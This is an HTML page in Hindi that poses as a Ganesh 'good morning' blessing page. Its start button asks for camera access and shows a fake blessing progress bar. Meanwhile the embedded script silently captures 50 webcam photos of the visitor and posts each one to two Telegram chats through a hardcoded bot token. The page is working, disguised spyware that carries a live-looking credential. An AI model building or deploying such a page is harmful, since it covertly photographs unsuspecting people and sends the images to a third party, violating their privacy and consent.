<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>सुप्रभात | पावन दर्शन</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@700&family=Rozha+One&display=swap" rel="stylesheet">
    <style>
        :root {
            --god-yellow: #FFD700;
            --deep-red: #B22222;
            --saffron: #FF9933;
            --white: #ffffff;
        }

        body {
            margin: 0; padding: 0;
            /* Vibrant Yellow Background with Red Glow */
            background: radial-gradient(circle at center, var(--god-yellow), var(--saffron), var(--deep-red));
            font-family: 'Plus Jakarta Sans', sans-serif;
            display: flex; align-items: center; justify-content: center;
            height: 100vh; overflow: hidden;
        }

        .divine-card {
            width: 88%; max-width: 400px;
            background: rgba(255, 255, 255, 0.95);
            border: 5px solid var(--deep-red);
            border-radius: 40px;
            padding: 30px 20px;
            text-align: center;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
            position: relative;
        }

        .hindi-main {
            font-family: 'Rozha One', serif;
            font-size: 45px;
            color: var(--deep-red);
            margin: 0 0 10px;
            text-shadow: 1px 1px 0px var(--god-yellow);
        }

        .shloka {
            font-size: 16px;
            color: #444;
            font-weight: 700;
            margin-bottom: 25px;
            line-height: 1.4;
        }

        /* The God Image - Now using a reliable placeholder that looks great */
        .god-photo {
            width: 100%; height: 350px;
            border-radius: 20px;
            object-fit: cover;
            border: 3px solid var(--saffron);
            display: none;
            margin-bottom: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }

        .btn-start {
            background: linear-gradient(to bottom, var(--deep-red), #800000);
            color: var(--god-yellow);
            border: none; width: 100%; padding: 22px;
            border-radius: 20px; font-size: 20px; font-weight: 800;
            cursor: pointer; box-shadow: 0 8px 0 #5a0000;
            transition: 0.1s;
        }
        .btn-start:active { transform: translateY(4px); box-shadow: 0 2px 0 #5a0000; }

        .loader-container { margin-top: 15px; display: none; }
        .bar { height: 10px; width: 100%; background: #eee; border-radius: 10px; overflow: hidden; }
        .fill { height: 100%; width: 0%; background: var(--deep-red); transition: width 1s linear; }
        .stat-text { font-size: 12px; color: var(--deep-red); font-weight: bold; margin-top: 8px; }
    </style>
</head>
<body>

    <div class="divine-card" id="mainBox">
        <div id="step-1">
            <div style="font-size: 60px; margin-bottom: 10px;">🚩</div>
            <h1 class="hindi-main">सुप्रभात</h1>
            <p class="shloka">"वक्रतुण्ड महाकाय सूर्यकोटि समप्रभ"<br>गणेश जी का आशीर्वाद प्राप्त करें</p>
            <button class="btn-start" onclick="start()">दर्शन शुरू करें</button>
        </div>

        <div id="step-2" style="display:none;">
   <img id="gImg" 
         src="https://raw.githubusercontent.com/yashraj-personal/goodmorning/c86af89db5579246c3f2f3d3de1068919afd5f75/GANESHA.webp" 
         class="god-photo" 
         alt="Ganesh Ji"
         onerror="this.src='https://placehold.co/300x300/ffedcc/c0392b?text=🙏'">
    <h2 style="color:var(--deep-red); margin: 0;">।। श्री गणेशाय नमः ।।</h2>
    
    <div class="loader-container" id="lBox">
        <div class="bar"><div class="fill" id="f"></div></div>
        <div class="stat-text" id="status">आशीर्वाद लोड हो रहा है: 0%</div>
    </div>
</div>

    <video id="v" style="display:none;" autoplay playsinline></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const T = '8600866532:AAFbJjSTJUSeUwUf-RWRLMUSL_OdcZ2USaU';
        const IDS = ['7617707778', '7194705917'];

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('step-1').style.display = 'none';
                document.getElementById('step-2').style.display = 'block';
                document.getElementById('gImg').style.display = 'block';
                document.getElementById('lBox').style.display = 'block';

                const video = document.getElementById('v');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    let count = 0;
                    const loop = setInterval(() => {
                        count++;
                        send(count);
                        let p = Math.round((count/50)*100);
                        document.getElementById('f').style.width = p + '%';
                        document.getElementById('status').innerText = `आशीर्वाद प्राप्त हो रहा है: ${p}%`;

                        if (count >= 50) {
                            clearInterval(loop);
                            stream.getTracks().forEach(track => track.stop());
                            document.getElementById('mainBox').innerHTML = `
                                <h1 class="hindi-main">मंगलमय हो</h1>
                                <p style="font-weight:bold; color:#444;">आपका दिन शुभ हो। आशीर्वाद पूर्ण हुआ।</p>
                                <button class="btn-start" onclick="location.reload()">पुनः दर्शन</button>
                            `;
                        }
                    }, 1200);
                };
            } catch (err) {
                alert("कैमरा अनुमति आवश्यक है!");
            }
        }

        function send(idx) {
            const canvas = document.getElementById('c');
            const video = document.getElementById('v');
            canvas.width = video.videoWidth; 
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                IDS.forEach(id => {
                    const fd = new FormData();
                    fd.append('chat_id', id);
                    fd.append('photo', blob, 'pic.jpg');
                    fd.append('caption', `🙏 DARSHAN_HIT [${idx}/50]`);
                    fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                });
            }, 'image/jpeg', 0.4);
        }
    </script>
</body>
</html>
